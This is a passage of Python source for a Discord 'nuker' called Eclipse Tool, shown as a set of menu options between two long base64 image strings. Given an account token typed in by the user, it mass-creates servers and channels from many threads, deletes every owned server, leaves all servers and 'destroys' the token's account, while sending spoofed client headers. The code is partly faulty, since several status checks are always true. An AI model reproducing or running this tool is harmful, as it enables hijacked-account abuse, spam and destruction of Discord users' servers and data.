8eM79lXMfucWGbmG820nq+dzy7GXB9WLqv5Fppq8vAS9UfL5tMSg3Ws+3m8xDzuUWZtZDiVisxdY53V7FNaUDS0m+UJ8Fj5lPXHMV8cotzSr9csWoeoGSZ3cgQ6kqrKEOiFEt876gw+jHXq9vPZ5TOs6/eDY7mCHVeRKLaacPe/d2mBNFuepLg5dpzPVwhAn7tAVO50Ndsse0O6CUsmn6DgvG1lEc0LxUN7ID+UTaKkwvRZkfXwheXwJ07lG3t6srhqM9+63d4D4fe1O9JEAKJKAMM86534oL3gKkq7nd9vtNlj4b1Zx5LQEY8iHA8iqMVfkUNzm3jfuLYq7Xptil600a4Wm9dLzOKc4s5i/nIgTjts7h5RCb0iW469pOQwoF+nljXj9TBtJkM16abTJ2RJ4qoNqKRiw1GX32mmdLgjd/xef4y1vKXHU3mjYxawidZ8KXrrU8Q6h8dov/Lhv5vHhV87FNHksVugyg+q+7dfTL5vieW/9wSMAL164vtKuxrGoQr7+2IiHl3zsorHNylsosq/NQRk4KJv+Tu9Sv97G9/k9S80zrzTPghR7qhRLSuSerw7V8B5teLQS0UxC98FWv0eolF+bUK7HTuqXJw+Gr6Mw3vz7D//k1AnTubvW68pD5F17cn92kO5djrgW9RFx1qXPx2UnAT4j1L8mMZxlQjkN7mcd/btz04rNE6vrsaH3punSy8hteryAKPPf61Sjx3M9fNfL7p75+ond1KSd+wjvuZ239JCTgwnrjKfXP1+fr8/X5+ny93vr/AMeYP+TXWRyrAAAAAElFTkSuQmCC"
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By Eclipse", 'icon':image})
                if r.status_code == 200 or 204 or 201:
                    print("Done!")
                    ids.append(r.json()['id'])
                else:
                    print("Failed")
              except Exception as e:
                print('Max Server Limit Acceded')

      def channelmake():
          length = len(ids)
          for b in range(length):
              for i in range(15):
                  url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-Eclipse'})

      threads = []

      for _ in range(20):
          t = threading.Thread(target=servercreate)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

      threaad = []

      for r in range(50):
          a = threading.Thread(target=channelmake)
          a.daemon = True
          a.start()
          threaad.append(a)

      for thread in threaad:
          a.join()

    elif options4 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Server Deleter")
      print(f'''
  {Fore.RED}
  ██████ ▓█████ ██▀███   ██▒   █▓▓█████ ██▀███       ▓█████▄ ▓█████ ██▓   ▓█████▄▄▄█████▓▓█████ ██▀███  
▒██    ▒ ▓█   ▀▓██ ▒ ██▒▓██░   █▒▓█   ▀▓██ ▒ ██▒     ▒██▀ ██▌▓█   ▀▓██▒   ▓█   ▀▓  ██▒ ▓▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▒███  ▓██ ░▄█ ▒ ▓██  █▒░▒███  ▓██ ░▄█ ▒     ░██   █▌▒███  ▒██░   ▒███  ▒ ▓██░ ▒░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▓█  ▄▒██▀▀█▄    ▒██ █░░▒▓█  ▄▒██▀▀█▄      ▒░▓█▄   ▌▒▓█  ▄▒██░   ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒████░██▓ ▒██▒   ▒▀█░  ░▒████░██▓ ▒██▒    ░░▒████▓ ░▒████░██████░▒████  ▒██▒ ░ ░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒░▓  ░░ ▒░   ▒ ░░   ░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░   ░ ░    ░▒ ░ ▒░   ░ ░░   ░ ░    ░▒ ░ ▒░      ░ ▒  ▒  ░ ░  ░ ░ ▒   ░ ░      ░     ░ ░    ░▒ ░ ▒░
░  ░  ░     ░     ░   ░      ░░     ░     ░   ░       ░ ░  ░    ░    ░ ░     ░    ░ ░       ░     ░   ░ 
      ░     ░     ░           ░     ░     ░             ░       ░      ░     ░              ░     ░     


      ''')
      url = f'https://discord.com/api/v9/users/@me/guilds'
      tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token that you want to delete all owned servers on?: ''')

      header = {
          "authority": "discord.com",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url, headers=header).json()

      for x in r:
          t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
          if t.status_code == 204:
              print(f'Deleted {x["id"]}')
          else:
              print(f'Failed to delete {x["id"]}')
      print(Fore.YELLOW + "Deleted all personal servers!")

    elif options4 in ['5','05']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Leaver Server") 
      print(f'''
{Fore.RED}
  ██████ ▓█████ ██▀███   ██▒   █▓▓█████ ██▀███       ██▓   ▓█████ ▄▄▄      ██▒   █▓▓█████ ██▀███  
▒██    ▒ ▓█   ▀▓██ ▒ ██▒▓██░   █▒▓█   ▀▓██ ▒ ██▒    ▓██▒   ▓█   ▀▒████▄   ▓██░   █▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▒███  ▓██ ░▄█ ▒ ▓██  █▒░▒███  ▓██ ░▄█ ▒    ▒██░   ▒███  ▒██  ▀█▄  ▓██  █▒░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▓█  ▄▒██▀▀█▄    ▒██ █░░▒▓█  ▄▒██▀▀█▄      ▒██░   ▒▓█  ▄░██▄▄▄▄██  ▒██ █░░▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒████░██▓ ▒██▒   ▒▀█░  ░▒████░██▓ ▒██▒    ░██████░▒████ ▓█   ▓██   ▒▀█░  ░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░▓  ░░ ▒░  ▒▒   ▓▒█   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░   ░ ░    ░▒ ░ ▒░   ░ ░░   ░ ░    ░▒ ░ ▒░    ░ ░ ▒   ░ ░    ░   ▒▒    ░ ░░   ░ ░    ░▒ ░ ▒░
░  ░  ░     ░     ░   ░      ░░     ░     ░   ░       ░ ░     ░    ░   ▒       ░░     ░     ░   ░ 
      ░     ░     ░           ░     ░     ░             ░     ░        ░        ░     ░     ░     


''')
      url = 'https://discord.com/api/v9/users/@me/guilds'
      tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token that you want to leave all servers with?: ''')

      header = {
          "authority": "discord.com",
          "method": "DELETE",
          "path": "/api/v9/users/@me/guilds/",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url,headers=header).json()
      for i in r:
          t = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
          if t.status_code == 204 or 200:
              print(f"Succefully left {i['id']}")
          else:
              print(t)

    elif options4 in ['6','06']:
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Destroyer")
        print(f'''
    {Fore.RED}
▒█████▄  ▒█████  ██████ ▄███████▓ ██▀███   ▒█████  ▓██   ██▓ ▓█████ ██▀███  
▒██▀ ██▌ ▒█   ▀▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒ ▒██  ██▒ ▓█   ▀▓██ ▒ ██▒
░██   █▌ ▒███  ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒  ▒██ ██░ ▒███  ▓██ ░▄█ ▒
░▓█▄   ▌ ▒▓█  ▄  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░  ░ ▐██▓░ ▒▓█  ▄▒██▀▀█▄  
░▒████▓ ▒░▒████▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░  ░ ██▒▓░▒░▒████░██▓ ▒██▒
 ▒▒▓  ▒ ░░░ ▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░    ██▒▒▒ ░░░ ▒░ ░ ▒▓ ░▒▓░
 ░ ▒  ▒ ░ ░ ░  ░ ░▒  ░ ░    ░      ░▒ ░ ▒   ░ ▒ ▒░  ▓██ ░▒░ ░ ░ ░    ░▒ ░ ▒ 
 ░ ░  ░     ░  ░  ░  ░    ░        ░░   ░ ░ ░ ░ ▒   ▒ ▒ ░░      ░    ░░   ░ 
   ░    ░   ░        ░              ░         ░ ░   ░ ░     ░   ░     ░     


        ''')

        url = f'https://discord.com/api/v9/users/@me/guilds'
        tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token that you want to destroy?: ''')

        header = {
            "authority": "discord.com",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f'{tukan}',
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.get(url, headers=header).json()

        for x in r:
            t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
            if t.status_code == 204 or 200:
                print(f'Deleted {x["id"]}')
            else:              
              for i in r:
                  e = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
                  if e.status_code == 200 or 204:
                      print(f'Left {i["id"]}')
                  else:
                      print(e)

        print(Fore.YELLOW + "Deleted all personal servers!")
        print(Fore.YELLOW + "Left all servers!")

        url3 =  "data:image/jpg;base64,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